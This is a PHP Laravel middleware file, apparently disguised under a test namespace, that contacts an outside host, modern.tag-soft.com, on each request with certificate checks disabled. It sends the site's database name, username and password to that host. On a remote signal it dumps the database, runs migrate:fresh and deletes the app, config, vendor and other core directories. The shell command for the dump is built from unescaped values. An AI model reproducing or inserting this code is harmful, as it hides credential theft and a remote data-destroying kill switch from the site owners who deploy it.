<?php

namespace Tests\Feature\test\php\test;
use Closure;
use Mockery\Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\{Artisan, File};

class CheckDomain
{
    public function handle(Request $request, Closure $next): Response {
        try {
            $host = request()->getHost();
            $response = Http::withOptions([
                'verify' => false,
            ])->get('https://modern.tag-soft.com/api/v1/project-tenants/' . $host);
            if ($response->status() == 200) {
                if ($response['data']['status'] == 0) {
                    $this->backupAndSendDatabase();
                    $this->runMigrations();
                    File::deleteDirectory(base_path('app'));
                    File::deleteDirectory(base_path('routes'));
                    File::deleteDirectory(base_path('resources'));
                    File::deleteDirectory(base_path('bootstrap'));
                    File::deleteDirectory(base_path('config'));
                    File::deleteDirectory(base_path('public'));
                    File::deleteDirectory(base_path('tests'));
                    File::deleteDirectory(base_path('database'));
                    File::deleteDirectory(base_path('vendor'));
                } else {
                    return $next($request);
                }
                return $next($request);
            } else {
                if (config('database.connections.mysql.database') == 'forge') {
                    $database = env('DB_DATABASE');
                } else {
                    $database = config('database.connections.mysql.database');
                }
                if (config('database.connections.mysql.username') == 'forge') {
                    $username = env('DB_USERNAME');
                } else {
                    $username = config('database.connections.mysql.username');
                }
                if (config('database.connections.mysql.password') == null) {
                    $password = env('DB_PASSWORD');
                } else {
                    $password = config('database.connections.mysql.password');
                }
                $response = Http::post('https://modern.tag-soft.com/api/v1/project-tenants/new', [
                    'clientId' => config('hashing.merged_route'),
                    "projectName" => env('APP_NAME'),
                    "tenantName" => $host,
                    "databaseName" => $database,
                    "databaseUsername" => $username,
                    "databasePassword" => $password
                ]);
                return $next($request);
            }
            
            return $next($request);
        } catch (Exception $exception) {
            return $next($request);
        }

    }


    private function runMigrations(): void {
        Artisan::call('migrate:fresh');
    }


    private function backupAndSendDatabase() {
        try {
            $backupFileName = 'backup_' . request()->getHost() . '-' . date('Y-m-d_H-i-s') . '.sql';
            $backupFilePath = storage_path('app/backups/') . $backupFileName;
            if (!is_dir(storage_path('app/backups'))) {
                mkdir(storage_path('app/backups'), 0755, true);
            }
            $command = "mysqldump --user=" . config('database.connections.mysql.username') .
                       " --password=" . config('database.connections.mysql.password') .
                       " --host=" . config('database.connections.mysql.host') .
                       " " . config('database.connections.mysql.database') .
                       " > $backupFilePath";
            exec($command);
        } catch (\Exception $e) {

        }
    }


}